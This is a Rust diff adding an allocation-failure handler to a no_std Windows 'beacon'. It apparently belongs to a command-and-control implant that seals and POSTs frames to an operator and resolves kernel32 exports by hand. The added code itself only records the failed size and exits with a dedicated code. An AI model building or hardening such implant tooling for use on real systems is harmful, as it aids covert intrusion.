@@ -42,6 +42,12 @@
 
 #![cfg_attr(not(test), no_std)]
 #![cfg_attr(not(test), no_main)]
+// `#[alloc_error_handler]` is a nightly language feature (still unstable as of
+// the pinned toolchain era — see the Rust Unstable Book `alloc-error-handler`
+// page). It replaces the default no_std OOM path (a nounwind panic that the
+// `#[panic_handler]` would abort on) with the recoverable handler below. Only
+// needed for the shipped no_std build; test mode links std.
+#![cfg_attr(not(test), feature(alloc_error_handler))]
 
 extern crate alloc;
 
@@ -178,6 +184,61 @@ fn _panic(info: &core::panic::PanicInfo) -> ! {
     }
     // Defensive trap — only reached if we can't exit cleanly.
     let _ = info;
+    loop {
+        core::hint::spin_loop();
+    }
+}
+
+/// Size (bytes) of the most recent failed allocation, or 0 if none was ever
+/// recorded. Set by [`_alloc_error`] before the beacon enters its safe error
+/// state; it is the observable "minimal error flag" this architecture allows.
+/// A real error FRAME is not possible from the OOM path: encoding, sealing,
+/// and POSTing a frame all allocate (wire `Writer`, AEAD output, WinHTTP
+/// buffers), and we are already inside the allocation-failure path — see
+/// [`_alloc_error`] for the full rationale.
+static ALLOC_OOM_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
+
+/// Last recorded allocation-failure size (0 = no OOM observed since boot).
+/// Intended for diagnostics / a future in-process watchdog; not consulted by
+/// any shipped hot path.
+pub fn alloc_oom_size() -> u64 {
+    ALLOC_OOM_SIZE.load(core::sync::atomic::Ordering::Relaxed)
+}
+
+/// Allocation-failure handler (the modern `#[alloc_error_handler]`; OOM is no
+/// longer an abort on this toolchain — rustc routes `handle_alloc_error` here
+/// when the attribute is present, else to a default nounwind panic).
+///
+/// # Recoverable-OOM design (what the no_std architecture allows)
+/// The handler MUST diverge (`-> !`), so the beacon loop cannot resume after
+/// an OOM. What we CAN do without allocating:
+///   1. record the failed size in [`ALLOC_OOM_SIZE`] (the minimal error flag),
+///   2. drop a `diag_mark` (allocation-free; compile-time no-op in production
+///      builds) so nyx_diag builds leave a marker,
+///   3. exit cleanly with a DEDICATED exit code (`0xAD`) instead of the
+///      default path's panic → `ExitProcess(0xC000_0001)`. The distinct code
+///      lets the loader/harness tell an OOM apart from a crash and restart the
+///      beacon — the recoverable outcome for the operator.
+/// A wire error frame is intentionally NOT attempted: every step of the
+/// existing send path (`encode_batch` → `encode_frame` → `dispatch_send_recv`)
+/// allocates, and re-entering it from inside the allocator-failure path would
+/// recurse into the OOM handler.
+#[cfg(not(test))]
+#[alloc_error_handler]
+fn _alloc_error(layout: core::alloc::Layout) -> ! {
+    ALLOC_OOM_SIZE.store(layout.size() as u64, core::sync::atomic::Ordering::Relaxed);
+    #[cfg(target_os = "windows")]
+    {
+        crate::entry::diag_mark(b"ERR_ALLOC_OOM");
+        // Best-effort clean exit with the dedicated OOM code. If ExitProcess
+        // can't be resolved (catastrophic — ntdll/kernel32 gone), fall through
+        // to the defensive trap, mirroring the panic handler.
+        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
+            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
+            f(0xAD);
+        }
+    }
+    // Defensive trap — only reached if we can't exit cleanly.
     loop {
         core::hint::spin_loop();
     }
